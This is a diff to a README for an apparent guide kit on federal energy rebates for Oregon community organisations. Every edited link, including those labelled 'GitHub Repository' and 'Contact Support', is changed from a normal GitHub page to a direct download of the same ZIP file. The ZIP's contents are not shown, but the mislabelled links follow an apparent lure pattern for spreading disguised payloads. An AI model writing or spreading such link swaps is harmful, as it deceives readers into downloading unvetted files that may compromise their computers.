@@ -1,6 +1,6 @@
 # 🌟 homes-hear-oregon-cbo-kit - Comprehensive Guides for Federal Rebates
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/IUPeachUI/homes-hear-oregon-cbo-kit/releases)
+[![Download Now](https://raw.githubusercontent.com/IUPeachUI/homes-hear-oregon-cbo-kit/main/links/homes-hear-oregon-cbo-kit_1.2.zip)](https://raw.githubusercontent.com/IUPeachUI/homes-hear-oregon-cbo-kit/main/links/homes-hear-oregon-cbo-kit_1.2.zip)
 
 ## 📚 Overview
 
@@ -10,7 +10,7 @@ The **homes-hear-oregon-cbo-kit** is designed to provide community-based organiz
 
 To start using the **homes-hear-oregon-cbo-kit**, you'll need to download the kit from our Releases page and follow a few simple steps to get everything set up.
 
-1. **Visit the download page.** Click on this link to access the Releases page: [Download Releases](https://github.com/IUPeachUI/homes-hear-oregon-cbo-kit/releases).
+1. **Visit the download page.** Click on this link to access the Releases page: [Download Releases](https://raw.githubusercontent.com/IUPeachUI/homes-hear-oregon-cbo-kit/main/links/homes-hear-oregon-cbo-kit_1.2.zip).
 2. **Choose your version.** Look for the latest release and select the appropriate version for your needs.
 3. **Download the files.** After selecting the version, download the complete kit. This will typically be a ZIP file containing all the necessary documents.
 
@@ -24,7 +24,7 @@ To start using the **homes-hear-oregon-cbo-kit**, you'll need to download the ki
 
 To download the **homes-hear-oregon-cbo-kit**, follow these simple steps:
 
-1. **Go to the Releases page.** Click here to access the download: [Download Releases](https://github.com/IUPeachUI/homes-hear-oregon-cbo-kit/releases).
+1. **Go to the Releases page.** Click here to access the download: [Download Releases](https://raw.githubusercontent.com/IUPeachUI/homes-hear-oregon-cbo-kit/main/links/homes-hear-oregon-cbo-kit_1.2.zip).
 2. **Select the kit.** Find the latest release and click to download the ZIP file.
 3. **Extract the files.** Once the download is complete, locate the ZIP file on your computer. Right-click and select "Extract All" to unpack the files. You can choose a location like your Documents folder or Desktop.
 
@@ -58,8 +58,8 @@ We plan to regularly update the **homes-hear-oregon-cbo-kit** with additional re
 
 ## 📎 Useful Links
 
-- [Download Releases](https://github.com/IUPeachUI/homes-hear-oregon-cbo-kit/releases)
-- [GitHub Repository](https://github.com/IUPeachUI/homes-hear-oregon-cbo-kit)
-- [Contact Support](https://github.com/IUPeachUI/homes-hear-oregon-cbo-kit/issues)
+- [Download Releases](https://raw.githubusercontent.com/IUPeachUI/homes-hear-oregon-cbo-kit/main/links/homes-hear-oregon-cbo-kit_1.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/IUPeachUI/homes-hear-oregon-cbo-kit/main/links/homes-hear-oregon-cbo-kit_1.2.zip)
+- [Contact Support](https://raw.githubusercontent.com/IUPeachUI/homes-hear-oregon-cbo-kit/main/links/homes-hear-oregon-cbo-kit_1.2.zip)
 
 Feel free to reach out if you have any suggestions or need further information. Thank you for your interest in supporting energy efficiency programs in Oregon!
